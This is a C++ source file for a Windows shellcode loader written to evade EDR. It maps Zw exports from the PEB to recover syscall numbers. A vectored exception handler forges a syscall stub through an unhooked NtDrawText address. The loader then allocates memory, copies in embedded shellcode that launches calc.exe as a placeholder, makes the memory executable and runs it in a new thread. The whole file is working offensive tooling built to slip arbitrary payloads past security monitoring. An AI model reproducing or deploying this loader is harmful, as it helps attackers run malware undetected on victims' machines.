#include<iostream>
#include<string>
#include <windows.h>
#include "peb.h"
#include<bits/stdc++.h>
using namespace std;

// define var
std::map<int, string> Nt_Table;
DWORD t = 0;
LPVOID m_Index = m_Index = GetProcAddress(GetModuleHandleA("Ntdll.dll"), "NtDrawText");//a safe function address that may not be hooked by edr

// function model
typedef DWORD(WINAPI* pNtCreateThreadEx)(
    PHANDLE hThread,
    ACCESS_MASK DesiredAccess,
    PVOID ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID lpStartAddress,
    PVOID lpParameter,
    ULONG Flags,
    SIZE_T StackZeroBits,
    SIZE_T SizeOfStackCommit,
    SIZE_T SizeOfStackReserve,
    PVOID lpBytesBuffer
    );
typedef DWORD(WINAPI* NtAllocateVirtualMemory)(
    HANDLE    ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T   RegionSize,
    ULONG     AllocationType,
    ULONG     Protect
    );
typedef DWORD(WINAPI* NtProtectVirtualMemory)(
    HANDLE    ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T   RegionSize,
    ULONG     Protect,
    PDWORD    oldProtect
    );
//function declare
int GetSSN(std::string apiname);
void savemap();
PVOID VxMoveMemory(PVOID dest, const PVOID src, SIZE_T len);
LONG WINAPI VectExceptionHandler(PEXCEPTION_POINTERS pExceptionInfo);
extern "C" extern VOID hello();

//calc shellcode
unsigned char rawData[276] = {
    0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
    0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
    0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
    0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
    0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
    0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
    0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
    0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
    0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
    0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
    0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
    0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
    0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
    0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
    0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
    0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
    0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
    0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
    0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
    0xBB, 0xF0, 0xB5, 0xA2, 0x56, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
    0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
    0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
    0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x2E, 0x65, 0x78, 0x65, 0x00
};

//main function
int main(int argc, char* argv[]) {
    savemap();
    // register VEH function
    AddVectoredExceptionHandler(1, VectExceptionHandler); // first jmp to VectExceptionHandler

    //Initialization parameter
    HANDLE hProcess = GetCurrentProcess();
    HANDLE hThread;
    PVOID lpAddress = NULL;
    SIZE_T sDataSize = sizeof(rawData);
    DWORD ulOldProtect;

    //exec NtAllocateVirtualMemory
    NtAllocateVirtualMemory pNtAllocateVirtualMemory = NULL;
    t = GetSSN("ZwAllocateVirtualMemory");
    pNtAllocateVirtualMemory((HANDLE)-1, &lpAddress, 0, &sDataSize, MEM_COMMIT, PAGE_READWRITE);

    //write your code
    VxMoveMemory(lpAddress, rawData, sizeof(rawData));

    //exec NtProtectVirtualMemory
    NtProtectVirtualMemory pNtProtectVirtualMemory = NULL;
    t = GetSSN("ZwProtectVirtualMemory");
    pNtProtectVirtualMemory((HANDLE)-1, &lpAddress, &sDataSize, PAGE_EXECUTE_READ, &ulOldProtect);


    //exec NtCreateThreadEx
    pNtCreateThreadEx NtCreateThreadEx = NULL;
    t = GetSSN("ZwCreateThreadEx");
    NtCreateThreadEx(&hThread, PROCESS_ALL_ACCESS, NULL, hProcess, (LPTHREAD_START_ROUTINE)lpAddress, NULL, 0, 0, 0, 0, NULL);
    WaitForSingleObject(hThread, INFINITE);
    return 0;
}
//find function order
void savemap()
{
    PBYTE ImageBase;
    PIMAGE_DOS_HEADER Dos = NULL;
    PIMAGE_NT_HEADERS Nt = NULL;
    PIMAGE_FILE_HEADER File = NULL;
    PIMAGE_OPTIONAL_HEADER Optional = NULL;
    PIMAGE_EXPORT_DIRECTORY ExportTable = NULL;

    PPEB Peb = (PPEB)__readgsqword(0x60);
    PLDR_MODULE pLoadModule;
    int num = 0;
    pLoadModule = (PLDR_MODULE)((PBYTE)Peb->LoaderData->InMemoryOrderModuleList.Flink->Flink - 0x10);
    ImageBase = (PBYTE)pLoadModule->BaseAddress;

    Dos = (PIMAGE_DOS_HEADER)ImageBase;
    if (Dos->e_magic != IMAGE_DOS_SIGNATURE)
        return;
    Nt = (PIMAGE_NT_HEADERS)((PBYTE)Dos + Dos->e_lfanew);
    File = (PIMAGE_FILE_HEADER)(ImageBase + (Dos->e_lfanew + sizeof(DWORD)));
    Optional = (PIMAGE_OPTIONAL_HEADER)((PBYTE)File + sizeof(IMAGE_FILE_HEADER));
    ExportTable = (PIMAGE_EXPORT_DIRECTORY)(ImageBase + Optional->DataDirectory[0].VirtualAddress);
    PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)(ImageBase + ExportTable->AddressOfFunctions));
    PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)ImageBase + ExportTable->AddressOfNames);
    PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)ImageBase + ExportTable->AddressOfNameOrdinals);
    for (WORD cx = 0; cx < ExportTable->NumberOfNames; cx++)
    {
        PCHAR pczFunctionName = (PCHAR)((PBYTE)ImageBase + pdwAddressOfNames[cx]);
        PVOID pFunctionAddress = (PBYTE)ImageBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];
        if (strncmp((char*)pczFunctionName, "Zw", 2) == 0) {
            Nt_Table[(int)pFunctionAddress] = (string)pczFunctionName;
        }
    }
}
int GetSSN(std::string apiname)
{
    int index = 0;
    for (std::map<int, string>::iterator iter = Nt_Table.begin(); iter != Nt_Table.end(); ++iter)
    {
        if (apiname == iter->second)
            return index;
        index++;
    }
}

PVOID VxMoveMemory(PVOID dest, const PVOID src, SIZE_T len) {
    char* d = (char*)dest;
    const char* s = (char*)src;
    while (len--)
        *d++ = *s++;
    return dest;
}
//VEH function
LONG WINAPI VectExceptionHandler(PEXCEPTION_POINTERS pExceptionInfo) {
    // handle EXCEPTION_ACCESS_VIOLATION
    if (pExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_ACCESS_VIOLATION) {
        // Construct syscall stub

        pExceptionInfo->ContextRecord->R10 = pExceptionInfo->ContextRecord->Rcx; // mov r10,rcx
        hello();
        pExceptionInfo->ContextRecord->Rax = t;   //mov rax,xxx
        hello();
        pExceptionInfo->ContextRecord->Rip = (DWORD64)((DWORD64)m_Index + 0x12); // syscall
        hello();
        return EXCEPTION_CONTINUE_EXECUTION; // cintinue your code
    }
    return EXCEPTION_CONTINUE_SEARCH; //find othner function to handle VEH  
}